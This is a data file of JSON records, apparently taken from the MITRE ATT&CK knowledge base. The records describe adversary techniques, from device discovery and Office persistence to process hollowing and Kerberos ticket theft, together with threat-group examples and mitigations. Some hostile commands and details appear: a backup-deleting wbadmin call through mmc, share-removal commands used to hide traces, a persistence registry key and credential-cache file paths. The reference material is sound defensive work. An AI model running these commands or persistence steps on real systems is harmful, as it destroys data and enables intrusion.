{"text": " Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system. Peripheral devices could include auxiliary resources that support a variety of functionalities such as keyboards, printers, cameras, smart card readers, or removable storage. The information may be used to enhance their awareness of the system and network environment or may be used for further actions.", "idx": "https://attack.mitre.org/techniques/T1120", "title": "Peripheral Device Discovery", "entity": "Peripheral Device Discovery", "entity_type": "techniques", "entity_context": ["Zebrocy enumerates information about connected storage devices.", "TajMahal has the ability to identify connected Apple devices.", "A module in Prikormka collects information on available printers and disk drives.", "Ragnar Locker may attempt to connect to removable drives and mapped network drives.", "USBStealer monitors victims for insertion of removable drives. When dropped onto a second victim, it also enumerates drives connected to the system.", "BackdoorDiplomacy has used an executable to detect removable media, such as USB flash drives.", "Crutch can monitor for removable drives being plugged into the compromised machine.", "Attor has a plugin that collects information about inserted storage devices, modems, and phone devices.", "FlawedAmmyy will attempt to detect if a usable smart card is current inserted into a card reader.", "Turla has used <code>fsutil fsinfo drives</code> to list connected drives.", "RTM can obtain a list of smart card readers attached to the victim.", "Equation has used tools with the functionality to search for specific information about the attached hard drive that could be used to identify and overwrite the firmware.", "Cadelspy has the ability to steal information about printers and the documents sent to printers.", "DustySky can detect connected USB devices.", "njRAT will attempt to detect if the victim system has a camera during the initial infection. njRAT can also detect any removable drives connected to the system.", "OilRig has used tools to identify if a mouse is connected to a targeted system.", "T9000 searches through connected drives for removable storage devices.", "Crimson has the ability to discover pluggable/removable drives to extract files from.", "APT28 uses a module to receive a notification every time a USB mass storage device is inserted into a victim.", "jRAT can map UPnP ports.", "Gamaredon Group tools have contained an application to check performance of USB flash drives. Gamaredon Group has also used malware to scan for removable drives.", "Stuxnet enumerates removable drives for infection.", "WannaCry contains a thread that will attempt to scan for new attached drives every few seconds. If one is identified, it will encrypt the files on the attached device.", "APT37 has a Bluetooth device harvester, which uses Windows Bluetooth APIs to find information on connected Bluetooth devices. ", "Bandook can detect USB devices.", "Turian can scan for removable media to collect data.", "USBferry can check for connected USB devices.", "Machete detects the insertion of new devices by listening for the WM_DEVICECHANGE window message.  ", "Ramsay can scan for removable media which may contain documents for collection.\t", "Operation Wocao has discovered removable disks attached to a system.", "ObliqueRAT can discover pluggable/removable drives to extract files from.", "QakBot can identify peripheral devices on targeted systems.", "BlackEnergy can gather very specific information about attached USB devices, to include device instance ID and drive geometry.", "BADNEWS checks for new hard drives on the victim, such as USB devices, by listening for the WM_DEVICECHANGE window message.", "MoonWind obtains the number of removable drives from the victim.", "WastedLocker can enumerate removable drives prior to the encryption process.", "ADVSTORESHELL can list connected devices."], "is_subtechnique": false}
{"text": " Adversaries may compromise numerous third-party systems to form a botnet that can be used during targeting. A botnet is a network of compromised systems that can be instructed to perform coordinated tasks.(Citation: Norton Botnet) Instead of purchasing/renting a botnet from a booter/stresser service(Citation: Imperva DDoS for Hire), adversaries may build their own botnet by compromising numerous third-party systems. Adversaries may also conduct a takeover of an existing botnet, such as redirecting bots to adversary-controlled C2 servers.(Citation: Dell Dridex Oct 2015) With a botnet at their disposal, adversaries may perform follow-on activity such as large-scale [Phishing](https://attack.mitre.org/techniques/T1566) or Distributed Denial of Service (DDoS).", "idx": "https://attack.mitre.org/techniques/T1584/005", "title": "Botnet", "entity": "Botnet", "entity_type": "techniques", "entity_context": ["This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."], "is_subtechnique": true}
{"text": " Adversaries may abuse Microsoft Office add-ins to obtain persistence on a compromised system. Office add-ins can be used to add functionality to Office programs. (Citation: Microsoft Office Add-ins) There are different types of add-ins that can be used by the various Office products; including Word/Excel add-in Libraries (WLL/XLL), VBA add-ins, Office Component Object Model (COM) add-ins, automation add-ins, VBA Editor (VBE), Visual Studio Tools for Office (VSTO) add-ins, and Outlook add-ins. (Citation: MRWLabs Office Persistence Add-ins)(Citation: FireEye Mail CDS 2018) Add-ins can be used to obtain persistence because they can be set to execute code when an Office application starts.", "idx": "https://attack.mitre.org/techniques/T1137/006", "title": "Add-ins", "entity": "Add-ins", "entity_type": "techniques", "entity_context": ["On Windows 10, enable Attack Surface Reduction (ASR) rules to prevent Office applications from creating child processes and from writing potentially malicious executable content to disk. ", "Naikon has used the RoyalRoad exploit builder to drop a second stage loader, intel.wll, into the Word Startup folder on the compromised host."], "is_subtechnique": true}
{"text": " Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed binaries. Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files.", "idx": "https://attack.mitre.org/techniques/T1218", "title": "Signed Binary Proxy Execution", "entity": "Signed Binary Proxy Execution", "entity_type": "techniques", "entity_context": ["Consider using application control to prevent execution of binaries that are susceptible to abuse and not required for a given system or network.", "Microsoft's Enhanced Mitigation Experience Toolkit (EMET) Attack Surface Reduction (ASR) feature can be used to block methods of using using trusted binaries to bypass application control.", "Many native binaries may not be necessary within a given environment.", "Restrict execution of particularly vulnerable binaries to privileged accounts or groups that need to use it to lessen the opportunities for malicious usage."], "is_subtechnique": false}
{"text": " Adversaries may buy, steal, or download software tools that can be used during targeting. Tools can be open or closed source, free or commercial. A tool can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: [PsExec](https://attack.mitre.org/software/S0029)). Tool acquisition can involve the procurement of commercial software licenses, including for red teaming tools such as [Cobalt Strike](https://attack.mitre.org/software/S0154). Commercial software may be obtained through purchase, stealing licenses (or licensed copies of the software), or cracking trial versions.(Citation: Recorded Future Beacon 2019) Adversaries may obtain tools to support their operations, including to support execution of post-compromise behaviors. In addition to freely downloading or purchasing software, adversaries may steal software and/or software licenses from third-party entities (including other adversaries).", "idx": "https://attack.mitre.org/techniques/T1588/002", "title": "Tool", "entity": "Tool", "entity_type": "techniques", "entity_context": ["Silent Librarian has obtained free and publicly available tools including SingleFile and HTTrack to copy login pages of targeted organizations.", "Wizard Spider has obtained and used publicly-available post-exploitation frameworks and tools like Metasploit, Empire, Mimikatz.", "Night Dragon has obtained and used tools such as gsecdump.", "Threat Group-3390 has obtained and used tools such as Impacket, pwdump, Mimikatz, gsecdump, NBTscan, and Windows Credential Editor. ", "MuddyWater has made use of  legitimate tools ConnectWise and RemoteUtilities for access to target environments.", "Inception has obtained and used open-source tools such as LaZagne.", "APT39 has modified and used customized versions of publicly-available tools like PLINK and Mimikatz.", "APT1 has used various open-source tools for privilege escalation purposes.", "APT29 has obtained and used a variety of tools including Mimikatz, SDelete, Tor, meek, and Cobalt Strike.", "TEMP.Veles has obtained and used tools such as Mimikatz and PsExec.", "FIN5 has obtained and used a customized version of PsExec, as well as use other tools such as pwdump, SDelete, and Windows Credential Editor.", "Gorgon Group has obtained and used tools such as QuasarRAT and Remcos.", "Leafminer has obtained and used tools such as LaZagne, Mimikatz, PsExec, and MailSniper.", "Ke3chang has obtained and used tools such as Mimikatz.", "BackdoorDiplomacy has obtained a variety of open-source reconnaissance and red team tools for discovery and lateral movement.", "APT38 has obtained and used open-source tools such as Mimikatz.", "CopyKittens has used Metasploit and Empire for post-exploitation activities.", "Patchwork has obtained and used open-source tools such as QuasarRAT.", "Turla has obtained and customized publicly-available tools like Mimikatz.", "Thrip has obtained and used tools such as Mimikatz and PsExec.", "APT32 has obtained and used tools such as Mimikatz and Cobalt Strike, and a variety of other open-source tools from GitHub.", "BRONZE BUTLER has obtained and used open-source tools such as Mimikatz, gsecdump, and Windows Credential Editor.", "APT33 has obtained and leveraged publicly-available tools for early intrusion activities.", "Kimsuky has obtained and used tools such as Mimikatz and PsExec.", "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls.", "DarkVishnya has obtained and used tools such as Impacket, Winexe, and PsExec.", "WIRTE has obtained and used Empire for post-exploitation activities.", "CostaRicto has obtained open source tools to use in their operations.", "Whitefly has obtained and used tools such as Mimikatz.", "Blue Mockingbird has obtained and used tools such as Mimikatz.", "Sandworm Team has acquired open-source tools for some of it's operations; for example it acquired Invoke-PSImage to establish an encrypted channel from a compromised host to Sandworm Team's C2 server as part of its preparation for the 2018 Winter Olympics attack.", "Dragonfly has obtained and used tools such as Mimikatz, CrackMapExec, and PsExec.", "menuPass has used and modified open-source tools like Impacket, Mimikatz, and pwdump.", "Carbanak has obtained and used open-source tools such as PsExec and Mimikatz.", "APT19 has obtained and used publicly-available tools like Empire.", "GALLIUM has used a variety of widely-available tools, which in some cases they modified to add functionality and/or subvert antimalware solutions.", "Cobalt Group has obtained and used a variety of tools including Mimikatz, PsExec, Cobalt Strike, and SDelete.", "FIN10 has relied on publicly-available software to gain footholds and establish persistence in victim environments.", "Cleaver has obtained and used open-source tools such as PsExec, Windows Credential Editor, and Mimikatz.", "Silence has obtained and modified versions of publicly-available tools like Empire and PsExec. ", "Magic Hound has obtained and used open-source penetration testing tools like Havij, sqlmap, Metasploit, and Mimikatz.", "FIN6 has obtained and used tools such as Mimikatz, Cobalt Strike, and AdFind.", "Frankenstein has obtained and used Empire to deploy agents.", "PittyTiger has obtained and used tools such as Mimikatz and gsecdump.", "Ferocious Kitten has obtained open source tools for its operations, including JsonCPP and Psiphon.", "Chimera has obtained and used tools such as BloodHound, Cobalt Strike, Mimikatz, and PsExec.", "APT41 has obtained and used tools such as Mimikatz, pwdump, PowerSploit, and Windows Credential Editor.", "DarkHydrus has obtained and used tools such as Mimikatz, Empire, and Cobalt Strike.", "APT28 has obtained and used open-source tools like Koadic, Mimikatz, and Responder.", "IndigoZebra has acquired open source tools such as NBTscan and Meterpreter for their operations. ", "APT-C-36 obtained and used a modified variant of Imminent Monitor."], "is_subtechnique": true}
{"text": " Adversaries may remove share connections that are no longer useful in order to clean up traces of their operation. Windows shared drive and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) connections can be removed when no longer needed. [Net](https://attack.mitre.org/software/S0039) is an example utility that can be used to remove network share connections with the <code>net use \\\\system\\share /delete</code> command. (Citation: Technet Net Use)", "idx": "https://attack.mitre.org/techniques/T1070/005", "title": "Network Share Connection Removal", "entity": "Network Share Connection Removal", "entity_type": "techniques", "entity_context": ["Threat Group-3390 has detached network shares after exfiltrating files, likely to evade detection.", "\nInvisiMole can disconnect previously connected remote drives.", "RobbinHood disconnects all network shares from the computer with the command <code>net use * /DELETE /Y</code>.", "The <code>net use \\\\system\\share /delete</code> command can be used in Net to remove an established connection to a network share."], "is_subtechnique": true}
{"text": " An adversary may attempt to enumerate the cloud services running on a system after gaining access. These methods can differ from platform-as-a-service (PaaS), to infrastructure-as-a-service (IaaS), or software-as-a-service (SaaS). Many services exist throughout the various cloud providers and can include Continuous Integration and Continuous Delivery (CI/CD), Lambda Functions, Azure AD, etc. Adversaries may attempt to discover information about the services enabled throughout the environment. Azure tools and APIs, such as the Azure AD Graph API and Azure Resource Manager API, can enumerate resources and services, including applications, management groups, resources and policy definitions, and their relationships that are accessible by an identity.(Citation: Azure - Resource Manager API)(Citation: Azure AD Graph API) Stormspotter is an open source tool for enumerating and constructing a graph for Azure resources and services, and Pacu is an open source AWS exploitation framework that supports several methods for discovering cloud services.(Citation: Azure - Stormspotter)(Citation: GitHub Pacu)", "idx": "https://attack.mitre.org/techniques/T1526", "title": "Cloud Service Discovery", "entity": "Cloud Service Discovery", "entity_type": "techniques", "entity_context": [], "is_subtechnique": false}
{"text": " Adversaries may access data objects from improperly secured cloud storage. Many cloud service providers offer solutions for online data storage such as Amazon S3, Azure Storage, and Google Cloud Storage. These solutions differ from other storage solutions (such as SQL or Elasticsearch) in that there is no overarching application. Data from these solutions can be retrieved directly using the cloud provider's APIs. Solution providers typically offer security guides to help end users configure systems.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) Misconfiguration by end users is a common problem. There have been numerous incidents where cloud storage has been improperly secured (typically by unintentionally allowing public access by unauthenticated users or overly-broad access by all users), allowing open access to credit cards, personally identifiable information, medical records, and other sensitive information.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017) Adversaries may also obtain leaked credentials in source repositories, logs, or other means as a way to gain access to cloud storage objects that have access permission controls.", "idx": "https://attack.mitre.org/techniques/T1530", "title": "Data from Cloud Storage Object", "entity": "Data from Cloud Storage Object", "entity_type": "techniques", "entity_context": ["Use access control lists on storage systems and objects.", "Cloud service providers support IP-based restrictions when accessing cloud resources. Consider using IP allowlisting along with user account management to ensure that data access is restricted not only to valid users but only from expected IP ranges to mitigate the use of stolen credentials to access data.", "Configure user permissions groups and roles for access to cloud storage. Implement strict Identity and Access Management (IAM) controls to prevent access to storage solutions except for the applications, users, and services that require access. Ensure that temporary access tokens are issued rather than permanent credentials, especially when access is being granted to entities outside of the internal security boundary.", "Frequently check permissions on cloud storage to ensure proper permissions are set to deny open or unprivileged access to resources.", "Encrypt data stored at rest in cloud storage. Managed encryption keys can be rotated by most providers. At a minimum, ensure an incident response plan to storage breach includes rotating the keys and test for impact on client applications.", "Fox Kitten has obtained files from the victim's cloud storage instances.", "Consider using multi-factor authentication to restrict access to resources and cloud storage APIs."], "is_subtechnique": false}
{"text": " Adversaries may use macOS logon scripts automatically executed at logon initialization to establish persistence. macOS allows logon scripts (known as login hooks) to be executed whenever a specific user logs into a system. A login hook tells Mac OS X to execute a certain script when a user logs in, but unlike [Startup Items](https://attack.mitre.org/techniques/T1037/005), a login hook executes as the elevated root user.(Citation: creating login hook) Adversaries may use these login hooks to maintain persistence on a single system.(Citation: S1 macOs Persistence) Access to login hook scripts may allow an adversary to insert additional malicious code. There can only be one login hook at a time though and depending on the access configuration of the hooks, either local credentials or an administrator account may be necessary.", "idx": "https://attack.mitre.org/techniques/T1037/002", "title": "Logon Script (Mac)", "entity": "Logon Script (Mac)", "entity_type": "techniques", "entity_context": ["Restrict write access to logon scripts to specific administrators."], "is_subtechnique": true}
{"text": " Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program. Search order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001), the search order differs depending on the method that is used to execute the program. (Citation: Microsoft CreateProcess) (Citation: Windows NT Command Shell) (Citation: Microsoft WinExec) However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory. For example, \"example.exe\" runs \"cmd.exe\" with the command-line argument <code>net user</code>. An adversary may place a program called \"net.exe\" within the same directory as example.exe, \"net.exe\" will be run instead of the Windows system utility net. In addition, if an adversary places a program called \"net.com\" in the same directory as \"net.exe\", then <code>cmd.exe /C net user</code> will execute \"net.com\" instead of \"net.exe\" due to the order of executable extensions defined under", "idx": "https://attack.mitre.org/techniques/T1574/008", "title": "Path Interception by Search Order Hijacking", "entity": "Path Interception by Search Order Hijacking", "entity_type": "techniques", "entity_context": ["Find and eliminate path interception weaknesses in program configuration files, scripts, the PATH environment variable, services, and in shortcuts by surrounding PATH variables with quotation marks when functions allow for them. Be aware of the search order Windows uses for executing or loading binaries and use fully qualified paths wherever appropriate.\n\nClean up old Windows Registry keys when software is uninstalled to avoid keys with no associated legitimate binaries. Periodically search for and correct or report path interception weaknesses on systems that may have been introduced using custom or available tools that report software using insecure path configurations.", "Adversaries will likely need to place new binaries in locations to be executed through this weakness. Identify and block potentially malicious software executed path interception by using application control tools, like Windows Defender Application Control, AppLocker, or Software Restriction Policies where appropriate.", "PowerSploit contains a collection of Privesc-PowerUp modules that can discover and exploit search order hijacking vulnerabilities.", "Ensure that proper permissions and directory access control are set to deny users the ability to write files to the top-level directory <code>C:</code> and system directories, such as <code>C:\\Windows\\</code>, to reduce places where malicious files could be placed for execution. Require that all executables be placed in write-protected directories.", "Empire contains modules that can discover and exploit search order hijacking vulnerabilities."], "is_subtechnique": true}
{"text": " Adversaries may abuse mmc.exe to proxy execution of malicious .msc files. Microsoft Management Console, or MMC, is a signed Windows binary and is used in several ways in either its GUI or in a command prompt.(Citation: win_mmc)(Citation: what_is_mmc) MMC can be used to create, open, and save custom consoles that contain administrative tools created by Microsoft, called snap-ins. These snap-ins may be used to manage Windows systems locally or remotely. MMC can also be used to open Microsoft created .msc files to manage system configuration.(Citation: win_msc_files_overview) For example, <code>mmc C:\\Users\\foo\\admintools.msc /a</code> will open a custom, saved console msc file in author mode.(Citation: win_mmc) Another common example is <code>mmc gpedit.msc</code>, which will open the Group Policy Editor application window. Adversaries may use MMC commands to perform malicious tasks. For example, <code>mmc wbadmin.msc delete catalog -quiet</code> deletes the backup catalog on the system (i.e. [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490)) without prompts to the user (Note: <code>wbadmin.msc</code> may only be present by default on Windows Server operating systems).(Citation: win_wbadmin_delete_catalog)(Citation: phobos_virustotal) Adversaries may also abuse MMC to execute malicious .msc files. For example, adversaries may first create a malicious registry Class Identifier (CLSID) subkey, which uniquely identifies a [Component Object Model](https://attack.mitre.org/techniques/T1559/001) class object.(Citation: win_clsid_key) Then, adversaries may create custom consoles with the “Link to Web Address” snap-in that is linked to the malicious CLSID subkey.(Citation: mmc_vulns) Once the .msc file is saved, adversaries may invoke the malicious CLSID payload with the following command: <code>mmc.exe -Embedding C:\\path\\to\\test.msc</code>.(Citation: abusing_com_reg)", "idx": "https://attack.mitre.org/techniques/T1218/014", "title": "MMC", "entity": "MMC", "entity_type": "techniques", "entity_context": ["Use application control configured to block execution of MMC if it is not required for a given system or network to prevent potential misuse by adversaries.", "MMC may not be necessary within a given environment since it is primarily used by system administrators, not regular users or clients. "], "is_subtechnique": true}
{"text": " Adversaries may abuse the Microsoft Office \"Office Test\" Registry key to obtain persistence on a compromised system. An Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office application is started. This Registry key is thought to be used by Microsoft to load DLLs for testing and debugging purposes while developing Office applications. This Registry key is not created by default during an Office installation.(Citation: Hexacorn Office Test)(Citation: Palo Alto Office Test Sofacy) There exist user and global Registry keys for the Office Test feature: * <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf</code> * <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Office test\\Special\\Perf</code> Adversaries may add this Registry key and specify a malicious DLL that will be executed whenever an Office application, such as Word or Excel, is started.", "idx": "https://attack.mitre.org/techniques/T1137/002", "title": "Office Test", "entity": "Office Test", "entity_type": "techniques", "entity_context": ["Create the Registry key used to execute it and set the permissions to \"Read Control\" to prevent easy access to the key without administrator permissions or requiring Privilege Escalation.", "On Windows 10, enable Attack Surface Reduction (ASR) rules to prevent Office applications from creating child processes and from writing potentially malicious executable content to disk. ", "APT28 has used the Office Test persistence mechanism within Microsoft Office by adding the Registry key <code>HKCU\\Software\\Microsoft\\Office test\\Special\\Perf</code> to execute code."], "is_subtechnique": true}
{"text": " **This technique has been deprecated and should no longer be used.** Adversaries may add malicious content to an internally accessible website through an open network file share that contains the website's webroot or Web content directory (Citation: Microsoft Web Root OCT 2016) (Citation: Apache Server 2018) and then browse to that content with a Web browser to cause the server to execute the malicious content. The malicious content will typically run under the context and permissions of the Web server process, often resulting in local system or administrative privileges, depending on how the Web server is configured. This mechanism of shared access and remote execution could be used for lateral movement to the system running the Web server. For example, a Web server running PHP with an open network share could allow an adversary to upload a remote access tool and PHP script to execute the RAT on the system running the Web server when a specific page is visited. (Citation: Webroot PHP 2011)", "idx": "https://attack.mitre.org/techniques/T1051", "title": "Shared Webroot", "entity": "Shared Webroot", "entity_type": "techniques", "entity_context": ["Networks that allow for open development and testing of Web content and allow users to set up their own Web servers on the enterprise network may be particularly vulnerable if the systems and Web servers are not properly secured to limit unauthenticated network share access and network/system isolation", "Disable execution on directories within the webroot. Ensure proper permissions on directories that are accessible through a Web server.", "Disallow remote access to the webroot or other directories used to serve Web content.", "Networks that allow for open development and testing of Web content and allow users to set up their own Web servers on the enterprise network may be particularly vulnerable if the systems and Web servers are not properly secured to limit privileged account use and unauthenticated network share access.", "Ensure that permissions of the Web server process are only what is required by not using built-in accounts; instead, create specific accounts to limit unnecessary access or permissions overlap across multiple systems.  "], "is_subtechnique": false}
{"text": " Adversaries may attempt to subvert Kerberos authentication by stealing or forging Kerberos tickets to enable [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003). Kerberos is an authentication protocol widely used in modern Windows domain environments. In Kerberos environments, referred to as “realms”, there are three basic participants: client, service, and Key Distribution Center (KDC).(Citation: ADSecurity Kerberos Ring Decoder) Clients request access to a service and through the exchange of Kerberos tickets, originating from KDC, they are granted access after having successfully authenticated. The KDC is responsible for both authentication and ticket granting. Attackers may attempt to abuse Kerberos by stealing tickets or forging tickets to enable unauthorized access. On Windows, the built-in <code>klist</code> utility can be used to list and analyze cached Kerberos tickets.(Citation: Microsoft Klist) Linux systems on Active Directory domains store Kerberos credentials locally in the credential cache file referred to as the \"ccache\". The credentials are stored in the ccache file while they remain valid and generally while a user's session lasts.(Citation: MIT ccache) On modern Redhat Enterprise Linux systems, and derivative distributions, the System Security Services Daemon (SSSD) handles Kerberos tickets. By default SSSD maintains a copy of the ticket database that can be found in <code>/var/lib/sss/secrets/secrets.ldb</code> as well as the corresponding key located in <code>/var/lib/sss/secrets/.secrets.mkey</code>. Both files require root access to read. If an adversary is able to access the database and key, the credential cache Kerberos blob can be extracted and converted into a usable Kerberos ccache file that adversaries may use for [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003). The ccache file may also be converted", "idx": "https://attack.mitre.org/techniques/T1558", "title": "Steal or Forge Kerberos Tickets", "entity": "Steal or Forge Kerberos Tickets", "entity_type": "techniques", "entity_context": ["Enable AES Kerberos encryption (or another stronger encryption algorithm), rather than RC4, where possible.", "Ensure strong password length (ideally 25+ characters) and complexity for service accounts and that these passwords periodically expire. Also consider using Group Managed Service Accounts or another third party product such as password vaulting.", "Limit domain admin account permissions to domain controllers and limited servers. Delegate other admin functions to separate accounts.\n\nLimit service accounts to minimal required privileges, including membership in privileged groups such as Domain Administrators.", "For containing the impact of a previously generated golden ticket, reset the built-in KRBTGT account password twice, which will invalidate any existing golden tickets that have been created with the KRBTGT hash and other Kerberos tickets derived from it. For each domain, change the KRBTGT account password once, force replication, and then change the password a second time. Consider rotating the KRBTGT account password every 180 days."], "is_subtechnique": false}
{"text": " Adversaries may abuse the ROM Monitor (ROMMON) by loading an unauthorized firmware with adversary code to provide persistent access and manipulate device behavior that is difficult to detect. (Citation: Cisco Synful Knock Evolution)(Citation: Cisco Blog Legacy Device Attacks) ROMMON is a Cisco network device firmware that functions as a boot loader, boot image, or boot helper to initialize hardware and software when the platform is powered on or reset. Similar to [TFTP Boot](https://attack.mitre.org/techniques/T1542/005), an adversary may upgrade the ROMMON image locally or remotely (for example, through TFTP) with adversary code and restart the device in order to overwrite the existing ROMMON image. This provides adversaries with the means to update the ROMMON to gain persistence on a system in a way that may be difficult to detect.", "idx": "https://attack.mitre.org/techniques/T1542/004", "title": "ROMMONkit", "entity": "ROMMONkit", "entity_type": "techniques", "entity_context": ["Periodically check the integrity of system image to ensure it has not been modified.    ", "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific protocols, such as TFTP, can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific technique used by a particular adversary or tool, and will likely be different across various network configurations.  ", "Enable secure boot features to validate the digital signature of the boot environment and system image using a special purpose hardware device. If the validation check fails, the device will fail to boot preventing loading of unauthorized software.  "], "is_subtechnique": true}
{"text": " Adversaries may execute their own malicious payloads by hijacking the binaries used by an installer. These processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM. Another variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001). Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002). Several examples of this weakness in", "idx": "https://attack.mitre.org/techniques/T1574/005", "title": "Executable Installer File Permissions Weakness", "entity": "Executable Installer File Permissions Weakness", "entity_type": "techniques", "entity_context": ["Limit privileges of user accounts and groups so that only authorized administrators can interact with service changes and service binary target path locations. Deny execution from user directories such as file download directories and temp directories where able.", "Turn off UAC's privilege elevation for standard users <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System</code> to automatically deny elevation requests, add: <code>\"ConsentPromptBehaviorUser\"=dword:00000000</code>. Consider enabling installer detection for all users by adding: <code>\"EnableInstallerDetection\"=dword:00000001</code>. This will prompt for a password for installation and also log the attempt. To disable installer detection, instead add: <code>\"EnableInstallerDetection\"=dword:00000000</code>. This may prevent potential elevation of privileges through exploitation during the process of UAC detecting the installer, but will allow the installation process to continue without being logged.  ", "Use auditing tools capable of detecting file system permissions abuse opportunities on systems within an enterprise and correct them. Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for service file system permissions weaknesses."], "is_subtechnique": true}
{"text": " Adversaries may gather information about the victim's client configurations that can be used during targeting. Information about client configurations may include a variety of details and settings, including operating system/version, virtualization, architecture (ex: 32 or 64 bit), language, and/or time zone. Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) (ex: listening ports, server banners, user agent strings) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about the client configurations may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [External Remote Services](https://attack.mitre.org/techniques/T1133)).", "idx": "https://attack.mitre.org/techniques/T1592/004", "title": "Client Configurations", "entity": "Client Configurations", "entity_type": "techniques", "entity_context": ["HAFNIUM has interacted with Office 365 tenants to gather details regarding target's environments.", "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."], "is_subtechnique": true}
{"text": " Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process. Process hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such as <code>CreateProcess</code>, which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such as <code>ZwUnmapViewOfSection</code> or <code>NtUnmapViewOfSection</code> before being written to, realigned to the injected code, and resumed via <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively.(Citation: Leitch Hollowing)(Citation: Elastic Process Injection July 2017) This is very similar to [Thread Local Storage](https://attack.mitre.org/techniques/T1055/005) but creates a new process rather than targeting an existing process. This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process hollowing may also evade detection from security products since the execution is masked under a legitimate process.", "idx": "https://attack.mitre.org/techniques/T1055/012", "title": "Process Hollowing", "entity": "Process Hollowing", "entity_type": "techniques", "entity_context": ["BBSRAT has been seen loaded into msiexec.exe through process hollowing to hide its execution.", "ISMInjector hollows out a newly created process RegASM.exe and injects its payload into the hollowed process.", "Dtrack has used process hollowing shellcode to target a predefined list of processes from <code>%SYSTEM32%</code>.", "Lokibot has used process hollowing to inject itself into legitimate Windows process. ", "BADNEWS has a command to download an .exe and use process hollowing to inject it into a new process.", "Some Orz versions have an embedded DLL known as MockDll that uses process hollowing and Regsvr32 to execute another payload.", "Gorgon Group malware can use process hollowing to inject one of its trojans into another process.", "Duqu is capable of loading executable code via process hollowing.", "The NETWIRE payload has been injected into benign Microsoft executables via process hollowing.", "Cobalt Strike can use process hollowing for execution.", "Smoke Loader spawns a new copy of c:\\windows\\syswow64\\explorer.exe and then replaces the executable code in memory with malware.", "Azorult can decrypt the payload into memory, create a new suspended process of itself, then inject a decrypted payload to the new process and resume new process execution.", "A Threat Group-3390 tool can spawn svchost.exe and inject the payload into that process.", "menuPass has used process hollowing in iexplore.exe to load the RedLeaves implant.", "Astaroth can create a new process in a suspended state from a targeted legitimate process in order to unmap its memory and replace it with malicious code.", "QakBot can use process hollowing to execute its main payload.", "TrickBot injects into the svchost.exe process.", "Agent Tesla has used process hollowing to create and manipulate processes through sections of unmapped memory by reallocating that space with its malicious code. ", "Denis performed process hollowing through the API calls CreateRemoteThread, ResumeThread, and Wow64SetThreadContext.", "Ursnif has used process hollowing to inject into child processes.", "Some endpoint security solutions can be configured to block some types of process injection based on 